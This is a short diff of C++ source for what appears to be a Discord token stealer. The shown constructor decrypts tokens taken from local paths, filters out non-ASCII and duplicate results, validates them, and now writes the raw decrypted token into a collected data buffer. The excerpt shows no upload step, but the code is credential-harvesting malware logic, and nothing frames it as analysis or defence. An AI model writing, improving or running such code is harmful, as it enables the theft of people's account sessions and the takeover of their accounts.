@@ -40,6 +40,9 @@ Discord::Discord(vs svPaths) noexcept
 			if (decrypted.empty())
 				continue;
 
+			if (!utils::isASCII(decrypted))
+				continue;
+
 			//Do not validate token if duplicate
 			if (utils::bCheckForDuplicate<std::string>(this->validTokens, decrypted))
 				continue;
@@ -52,7 +55,7 @@ Discord::Discord(vs svPaths) noexcept
 				continue;
 
 
-			this->data.append(validated + "\n");
+			this->data.append("Token: " + decrypted + "\n" + validated + "\n");
 		}
 	}
 }
